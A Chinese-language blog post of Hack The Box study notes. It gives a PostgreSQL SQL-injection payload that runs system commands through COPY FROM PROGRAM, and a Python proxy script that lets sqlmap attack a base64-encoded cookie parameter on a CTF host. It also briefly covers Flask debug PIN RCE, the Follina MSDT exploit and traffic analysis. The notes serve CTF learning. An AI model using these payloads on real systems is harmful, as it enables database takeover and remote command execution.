---
title: HTB学习
typora-root-url: ..
date: 2022-07-18 19:27:49
tags: HTB

---



### 1.PostgreSQL  run command

利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令

```
DROP TABLE IF EXISTS cmd_exec;

-- Create a table to contain the result of my command
CREATE TABLE cmd_exec(cmd_output text); 

-- Execute the command and store the result
COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$'''; 

```

详细用法，参考：

- https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767
- https://erichogue.ca/2022/07/HTBBusinessCTF/DebuggerUnchained



### 2.flask debug模式 pin rce

配合任意文件读取漏洞，获取到生成PIN码的关键参数，即可计算出PIN码

参考：https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/





## 3.微软 MSDT 远程代码执行

 word 目录下的_rels 下的document.xml.rels插入恶意mhtml，不需要允许宏，即可利用MSDT 诊断 执行任意命令

工具使用：https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed

参考：https://blog.csdn.net/qq_17754023/article/details/125112334





## 4.流量分析技巧

- wireshark export HTTP文件，follow TCP/HTTP stream
- 上传到 Arkime 进行分析

![image-20220718194335947](/assets/image-20220718194335947.png)



### 5.sqlmap跑加密参数

例如 `{"id": 20, "output":"dGVzdGFh"}` 在提交时必须整个字符串进行base64 编码再提交，其中 id 存在sql注入。

可以写一个Python或者php脚本，对该请求进行封装

例如

```python
from sanic import Sanic
from sanic.response import text
import requests
import base64

app = Sanic(__name__)
@app.route("/")
async def test(request):
    a = '{"id": "'+str(request.args["a"][0])+'", "output": "a"}'
    # print(a)
    url = "http://142.93.37.65:30874/assets/jquery-3.6.0.slim.min.js"
    payload = {}
    cookie = '__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid='+(base64.b64encode(bytes(a.encode('utf-8')))).decode("utf-8")
    # return text(cookie)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Cookie': cookie
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    return text(response.text)

app.run(host="0.0.0.0", port=8000, debug=False)

```

此时测试时只需要使用sqlmap 扫描该python脚本提供的接口
